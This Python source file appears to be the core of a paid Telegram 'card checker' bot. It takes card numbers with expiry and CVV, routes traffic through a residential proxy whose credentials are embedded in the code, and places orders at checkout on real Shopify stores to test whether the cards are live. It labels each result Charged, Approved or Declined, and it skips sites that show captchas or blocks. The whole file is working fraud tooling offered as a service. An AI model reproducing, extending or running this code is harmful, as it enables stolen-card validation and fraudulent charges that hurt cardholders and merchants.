import requests
import re
import random
import logging
from datetime import datetime, timedelta
from typing import Dict, Optional, Tuple, List
import asyncio
from concurrent.futures import ThreadPoolExecutor
import aiohttp
import json
from urllib.parse import urlparse

from bin import get_bin_info
from database import get_or_create_user, update_user_credits, get_user_credits
from plans import get_user_current_tier
# Dictionary to store last command time for each user (for cooldown)


# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# Load domains from file
def load_domains() -> List[str]:
    """Load domains from domains.txt"""
    try:
        with open('domains.txt', 'r') as f:
            domains = [line.strip() for line in f if line.strip() and not line.startswith('#')]
        return domains
    except FileNotFoundError:
        logger.error("domains.txt not found! Creating with default domains.")
        default_domains = [
            "https://makeship.com",
            "https://chazdean.com",
            "https://naturallclub.com"
        ]
        with open('domains.txt', 'w') as f:
            f.write('\n'.join(default_domains))
        return default_domains

# Load domains at startup
SITE_URLS = load_domains()

# Proxies list
PROXIES = [
    "http://user-FG9IqFSVPYNRnxxV-type-residential-session-ydp0s2q8-country-US-city-New_York-rotation-15:RCMd2xUcgo5Swkxo@geo.g-w.info:10080",
]

# Dictionary to store last command time for each user (for cooldown)
last_command_time = {}

RETRY_ERRORS = [
    'captcha', 'hcaptcha', 'recaptcha',
    'risky', 'blocked', 'access denied',
    # ... rest of errors
]

# ADD THIS LINE:
last_command_time = {}

def get_random_proxy() -> Optional[str]:
    """Get random proxy or None if list empty"""
    return random.choice(PROXIES) if PROXIES else None

def parse_card_details(card_string: str) -> Optional[Tuple[str, str, str, str]]:
    """Same as your original function"""
    card_string = card_string.strip()
    
    patterns = [
        r'^(\d{13,19})\|(\d{1,2})\|(\d{2,4})\|(\d{3,4})$',
        r'^(\d{13,19})\/(\d{1,2})\/(\d{2,4})\/(\d{3,4})$',
        r'^(\d{13,19}):(\d{1,2}):(\d{2,4}):(\d{3,4})$',
        r'^(\d{13,19})\s+(\d{1,2})\s+(\d{2,4})\s+(\d{3,4})$',
    ]
    
    for pattern in patterns:
        match = re.match(pattern, card_string)
        if match:
            card_number, month, year, cvv = match.groups()
            month = month.zfill(2)
            if len(year) == 4:
                year = year[2:]
            return card_number, month, year, cvv
    
    return None

def extract_card_from_text(text: str) -> Optional[str]:
    """Same as your original function"""
    patterns = [
        r'(\d{13,19})\|(\d{1,2})\|(\d{2,4})\|(\d{3,4})',
        r'(\d{13,19})\/(\d{1,2})\/(\d{2,4})\/(\d{3,4})',
        r'(\d{13,19}):(\d{1,2}):(\d{2,4}):(\d{3,4})',
        r'(\d{13,19})\s+(\d{1,2})\s+(\d{2,4})\s+(\d{3,4})',
    ]
    
    for pattern in patterns:
        match = re.search(pattern, text)
        if match:
            card_number, month, year, cvv = match.groups()
            month = month.zfill(2)
            if len(year) == 4:
                year = year[2:]
            return f"{card_number}|{month}|{year}|{cvv}"
    
    return None

async def check_card_direct(site_url: str, card_number: str, month: str, year: str, cvv: str, proxy: Optional[str] = None) -> Dict:
    """
    Check card directly against Shopify site without external API
    """
    try:
        # Clean domain
        parsed = urlparse(site_url)
        domain = f"{parsed.scheme}://{parsed.netloc}"
        
        # Create session
        session = requests.Session()
        session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate, br',
            'DNT': '1',
            'Connection': 'keep-alive',
        })
        
        proxies = {"http": proxy, "https": proxy} if proxy else None
        
        # Step 1: Get a product page to establish session
        product_resp = session.get(f"{domain}/products.json?limit=1", proxies=proxies, timeout=10)
        
        if product_resp.status_code != 200:
            return {"status": False, "Response": f"Failed to access site (HTTP {product_resp.status_code})"}
        
        products = product_resp.json().get('products', [])
        if not products:
            return {"status": False, "Response": "No products found"}
        
        product = products[0]
        variant_id = product['variants'][0]['id'] if product.get('variants') else None
        
        if not variant_id:
            return {"status": False, "Response": "No variants found"}
        
        # Step 2: Add to cart
        cart_data = {
            "id": variant_id,
            "quantity": 1
        }
        
        cart_resp = session.post(
            f"{domain}/cart/add.js",
            json=cart_data,
            proxies=proxies,
            timeout=10
        )
        
        if cart_resp.status_code != 200:
            return {"status": False, "Response": f"Failed to add to cart (HTTP {cart_resp.status_code})"}
        
        # Step 3: Get checkout page
        checkout_resp = session.get(f"{domain}/checkout", proxies=proxies, timeout=10)
        
        if checkout_resp.status_code != 200:
            return {"status": False, "Response": f"Checkout failed (HTTP {checkout_resp.status_code})"}
        
        # Check for captcha
        if 'captcha' in checkout_resp.text.lower() or 'hcaptcha' in checkout_resp.text.lower():
            return {"status": False, "Response": "HCAPTCHA_DETECTED"}
        
        # Extract auth token
        auth_token_match = re.search(r'name="authenticity_token" value="([^"]+)"', checkout_resp.text)
        if not auth_token_match:
            return {"status": False, "Response": "Failed to get auth token"}
        
        auth_token = auth_token_match.group(1)
        
        # Step 4: Submit customer info (bypass with dummy data)
        customer_data = {
            "_method": "patch",
            "authenticity_token": auth_token,
            "checkout[email]": f"test{random.randint(1000,9999)}@gmail.com",
            "checkout[shipping_address][first_name]": "John",
            "checkout[shipping_address][last_name]": "Doe",
            "checkout[shipping_address][address1]": "123 Test St",
            "checkout[shipping_address][city]": "New York",
            "checkout[shipping_address][country]": "US",
            "checkout[shipping_address][province]": "NY",
            "checkout[shipping_address][zip]": "10001",
            "checkout[shipping_address][phone]": "5555555555",
            "checkout[client_details][browser_width]": "1920",
            "checkout[client_details][browser_height]": "1080",
            "checkout[client_details][javascript_enabled]": "1",
        }
        
        # Find the checkout ID from URL or page
        checkout_id_match = re.search(r'/checkouts/([a-f0-9]+)', checkout_resp.url) or \
                           re.search(r'checkoutId["\']?\s*:\s*["\']?([a-f0-9]+)', checkout_resp.text)
        
        if checkout_id_match:
            checkout_id = checkout_id_match.group(1)
        else:
            return {"status": False, "Response": "Failed to extract checkout ID"}
        
        # Submit shipping info
        shipping_resp = session.post(
            f"{domain}/checkout/{checkout_id}",
            data=customer_data,
            proxies=proxies,
            timeout=10,
            allow_redirects=True
        )
        
        # Step 5: Submit payment (this is where card check happens)
        # Format expiry
        expiry_month = month.zfill(2)
        expiry_year = year if len(year) == 4 else f"20{year}"
        
        payment_data = {
            "_method": "patch",
            "authenticity_token": auth_token,
            "checkout[credit_card][number]": card_number,
            "checkout[credit_card][name]": "John Doe",
            "checkout[credit_card][month]": expiry_month,
            "checkout[credit_card][year]": expiry_year,
            "checkout[credit_card][verification_value]": cvv,
            "checkout[payment_gateway]": "shopify_payments",
        }
        
        payment_resp = session.post(
            f"{domain}/checkout/{checkout_id}",
            data=payment_data,
            proxies=proxies,
            timeout=15,
            allow_redirects=True
        )
        
        # Analyze response
        response_text = payment_resp.text.lower()
        
        # Check for various responses
        if any(x in response_text for x in ['thank you', 'order confirmed', 'order status']):
            return {"status": True, "Response": "Charged - Order placed successfully"}
        elif any(x in response_text for x in ['3d secure', '3ds', 'authentication required']):
            return {"status": True, "Response": "3D_AUTHENTICATION_REQUIRED"}
        elif any(x in response_text for x in ['insufficient funds', 'not enough funds']):
            return {"status": True, "Response": "INSUFFICIENT_FUNDS"}
        elif any(x in response_text for x in ['incorrect zip', 'zip code', 'postal code']):
            return {"status": True, "Response": "INCORRECT_ZIP"}
        elif any(x in response_text for x in ['invalid cvc', 'security code', 'cvv']):
            return {"status": True, "Response": "INVALID_CVC"}
        elif any(x in response_text for x in ['declined', 'rejected', 'not authorized']):
            return {"status": False, "Response": "CARD_DECLINED"}
        elif any(x in response_text for x in ['expired', 'expiration']):
            return {"status": False, "Response": "CARD_EXPIRED"}
        else:
            # Try to extract error message
            error_match = re.search(r'error["\']?\s*[:=]\s*["\']?([^"\'>]+)', payment_resp.text, re.I)
            if error_match:
                return {"status": False, "Response": error_match.group(1)[:100]}
            return {"status": False, "Response": f"Unknown response (HTTP {payment_resp.status_code})"}
            
    except requests.exceptions.ProxyError as e:
        return {"status": False, "Response": f"Proxy error: {str(e)[:50]}"}
    except requests.exceptions.Timeout:
        return {"status": False, "Response": "Connection timeout"}
    except requests.exceptions.ConnectionError:
        return {"status": False, "Response": "Connection error"}
    except Exception as e:
        return {"status": False, "Response": f"Error: {str(e)[:50]}"}

# This function will be called from main.py
async def handle_sh_command(update, context):
    """
    Handle the /sh command with user-specific cooldown for Trial users.
    Can also be used as a reply to a message containing card details.
    """
    # Get user info
    user_id = update.effective_user.id
    username = update.effective_user.username
    first_name = update.effective_user.first_name
    
    # Get user tier from plans module
    from plans import get_user_current_tier
    user_tier = get_user_current_tier(user_id)
    
    # Check cooldown for Free users (user-specific)
    current_time = datetime.now()
    
    # Apply cooldown to both Trial and Free users
    if user_tier in ["Trial", "Free"] and user_id in last_command_time:
        time_diff = current_time - last_command_time[user_id]
        if time_diff < timedelta(seconds=10):
            remaining_seconds = 10 - int(time_diff.total_seconds())
            await update.message.reply_text(
                f"⏳ <b>Please wait {remaining_seconds} seconds before using this command again.</b>\n\n"
                f"<i>Upgrade your plan to remove the time limit.</i>",
                parse_mode="HTML",
                disable_web_page_preview=True
            )
            return
    
    # Try to get card details from command arguments
    card_details = None
    
    # First check if arguments are provided
    if context.args:
        card_details = " ".join(context.args)
    # If no arguments, check if this is a reply to a message
    elif update.message.reply_to_message:
        # Try to extract card details from the replied message
        replied_text = update.message.reply_to_message.text or update.message.reply_to_message.caption or ""
        card_details = extract_card_from_text(replied_text)
    
    # If still no card details, show usage
    if not card_details:
        await update.message.reply_text(
            "⚠️ <b>Missing card details!</b>\n\n"
            "<i>Usage 1: /sh card|mm|yy|cvv</i>\n"
            "<i>Usage 2: Reply to a message containing card details with /sh</i>", 
            parse_mode="HTML",
            disable_web_page_preview=True
        )
        return
    
    # Get user credits BEFORE processing the card
    from database import get_user_credits, update_user_credits
    user_credits = get_user_credits(user_id)
    
    # Check if user has enough credits (or unlimited)
    is_unlimited = user_credits == float('inf')
    has_credits = user_credits is not None and (is_unlimited or user_credits > 0)
    
    # If user has no credits (and not unlimited), show warning and stop
    if not has_credits:
        await update.message.reply_text(
            f"""<a href='https://t.me/abtlnx'>⚠️</a> <b>𝙒𝙖𝙧𝙣𝙞𝙣𝙜:</b> <i>You have 0 credits left.</i>

<a href='https://t.me/failfr'>💳</a> <b>Please recharge to continue using this service.</b>

<a href='https://t.me/failfr'>📊</a> <b>Current Plan:</b> <code>{user_tier}</code>
<a href='https://t.me/failfr'>💰</a> <b>Credits:</b> <code>0</code>""",
            parse_mode="HTML",
            disable_web_page_preview=True
        )
        return
    
    # Create progress message
    progress_msg = f"""<pre>🔄 <b>𝗣𝗿𝗼𝗰𝗲𝘀𝘀𝗶𝗻𝗴 𝗥𝗲𝘁𝘂𝗲𝘀...</b></pre>
<pre>{card_details}</pre>
𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ↬ <i>𝗦𝗵𝗼𝗽𝗶𝗳𝘆 0.98$</i>"""
    
    # Send the progress message
    checking_message = await update.message.reply_text(progress_msg, parse_mode="HTML", disable_web_page_preview=True)
    
    # Prepare user info
    user_info = {
        "id": user_id,
        "username": username,
        "first_name": first_name
    }
    
    # Update the last command time for Free/Trial users immediately
    if user_tier in ["Trial", "Free"]:
        last_command_time[user_id] = current_time
    
    # Create a background task for the card check to avoid blocking
    async def background_check():
        try:
            # Run the asynchronous card check
            result = await check_card(card_details, user_info)
            
            # Deduct 1 credit if the response was successful and user doesn't have unlimited credits
            if result and not result.startswith("⚠️ <b>Missing card details!</b>") and not result.startswith("⚠️ <b>Error checking card:</b>"):
                # Only deduct credits if the user doesn't have unlimited
                if not is_unlimited:
                    # Deduct 1 credit in the background
                    update_user_credits(user_id, -1)
                    
                    # Get updated credits for the response
                    updated_credits = get_user_credits(user_id)
                    
                    # Add warning if credits are now 0
                    if updated_credits is not None and updated_credits <= 0:
                        # Add warning message at the end of the result
                        result = result + f"\n\n<a href='https://t.me/abtlnx'>⚠️</a> <b>𝙒𝙖𝙧𝙣𝙞𝙣𝙜:</b> <i>You have 0 credits left. Please recharge to continue using this service.</i>"
            
            # Edit the checking message with the result
            await checking_message.edit_text(result, parse_mode="HTML", disable_web_page_preview=True)
        except Exception as e:
            logger.error(f"Error in background check: {e}")
            error_msg = f"⚠️ <b>Error:</b> <code>{str(e)}</code>"
            await checking_message.edit_text(error_msg, parse_mode="HTML", disable_web_page_preview=True)
    
    # Schedule the background task without awaiting it to avoid blocking
    asyncio.create_task(background_check())

# Also add a handler for /shh command as an alias
async def handle_shh_command(update, context):
    """
    Handle the /shh command as an alias for /sh.
    """
    await handle_sh_command(update, context)

async def check_card(card_details: str, user_info: Dict) -> Optional[str]:
    """
    Check card directly against Shopify sites from domains.txt
    """
    # Parse card details
    parsed = parse_card_details(card_details)
    if not parsed:
        return "⚠️ <b>Missing card details!</b>\n\n<i>Usage: /sh card|mm|yy|cvv</i>"
    
    card_number, month, year, cvv = parsed
    
    # Get BIN info
    bin_number = card_number[:6]
    bin_details = await get_bin_info(bin_number)
    brand = (bin_details.get("scheme") or "N/A").title()
    issuer = bin_details.get("bank") or "N/A"
    country_name = bin_details.get("country") or "Unknown"
    country_flag = bin_details.get("country_emoji", "")
    
    # Reload domains (in case file changed)
    sites_to_try = load_domains()
    random.shuffle(sites_to_try)
    
    # Try each site
    for site_url in sites_to_try:
        proxy = get_random_proxy()
        
        try:
            # Check card directly
            result = await check_card_direct(site_url, card_number, month, year, cvv, proxy)
            
            # Check if we should retry
            response_text = result.get("Response", "").lower()
            should_retry = any(error.lower() in response_text for error in RETRY_ERRORS)
            
            if not should_retry:
                return format_response(result, user_info, card_details, brand, issuer, country_name, country_flag, site_url)
            else:
                logger.info(f"Retry error on {site_url}: {response_text[:50]}")
                continue
                
        except Exception as e:
            logger.error(f"Error checking {site_url}: {e}")
            continue
    
    return f"⚠️ <b>Error checking card:</b> <code>All sites failed or blocked</code>"

def format_response(api_response: Dict, user_info: Dict, card_details: str, 
                   brand: str, issuer: str, country_name: str, country_flag: str, site_url: str) -> str:
    """Same as your original format_response function"""
    response_text = api_response.get("Response", "N/A")
    status = api_response.get("status", False)
    
    response_text = response_text.replace("\\", "").replace("/", "").replace("\"", "").replace("'", "")
    site_name = site_url.replace("https://", "").replace("http://", "").split("/")[0]
    
    # Determine status
    status_emoji = "❓"
    status_text = "Unknown"
    status_style = ""
    
    if any(keyword in response_text.lower() for keyword in ["thank you", "order_placed", "approved", "success", "charged"]):
        status_emoji = "🔥"
        status_text = "Charged"
        status_style = "<b>𝘾𝙝𝙖𝙧𝙜𝙚𝙙</b> 🔥"
    elif any(keyword in response_text.lower() for keyword in ["3d_authentication", "3ds_required", "invalid_cvc", "insufficient_funds", "incorrect_zip"]):
        status_emoji = "✅"
        status_text = "Approved"
        status_style = "<b>𝘼𝙥𝙥𝙧𝙤𝙫𝙚𝙙</b> ✅"
    elif "card_declined" in response_text.lower():
        status_emoji = "❌"
        status_text = "Declined"
        status_style = "<b>𝘿𝙚𝙡𝙞𝙣𝙚𝙙</b> ❌"
    else:
        status_style = f"{status_emoji} <b>{status_text}</b>"
    
    user_id = user_info.get("id", "Unknown")
    username = user_info.get("username", "")
    first_name = user_info.get("first_name", "User")
    user_tier = get_user_current_tier(user_id)
    user_credits = get_user_credits(user_id)
    
    if user_credits is None:
        credits_display = "Error"
    elif user_credits == float('inf'):
        credits_display = "Infinite😎"
    else:
        credits_display = str(user_credits)

    user_link = f"<a href='tg://user?id={user_id}'>{first_name}</a> <code>[{user_tier}]</code>"
    
    status_part = f"""<pre><a href='https://t.me/failfr'>⩙</a> <b>𝑺𝒕𝒂𝒕𝒖𝒔</b> ↬ {status_style}</pre>"""
    
    bank_part = f"""<pre><b>𝑩𝒓𝒂𝒏𝒌</b> ↬ <code>{brand}</code>
<b>𝑩𝒂𝒏𝒌</b> ↬ <code>{issuer}</code>
<b>𝑪𝒐𝒖𝒏𝒕𝒓𝒚</b> ↬ <code>{country_name} {country_flag}</code></pre>"""
    
    card_part = f"""<a href='https://t.me/failfr'>⊀</a> <b>𝐂𝐚𝐫𝐝</b>
⤷ <code>{card_details}</code>"""
    
    formatted_response = f"""{status_part}
{card_part}
<a href='https://t.me/failfr'>⊀</a> <b>𝐆𝐚𝐭𝐞𝐰𝐚𝐲</b> ↬ <i>𝗦𝗵𝗼𝗽𝗶𝗳𝘆 0.98$</i>
<a href='https://t.me/failfr'>⊀</a> <b>𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞</b> ↬ <code>{response_text}</code>
{bank_part}
<a href='https://t.me/failfr'>⌬</a> <b>𝐔𝐬𝐞𝐫</b> ↬ {user_link} 
<a href='https://t.me/failfr'>⌬</a> <b>𝐃𝐞𝐯</b> ↬ <a href='https://t.me/failurefr_07'>kคli liຖนxx</a>"""
    
    return formatted_response

# Your handle_sh_command and handle_shh_command functions remain the same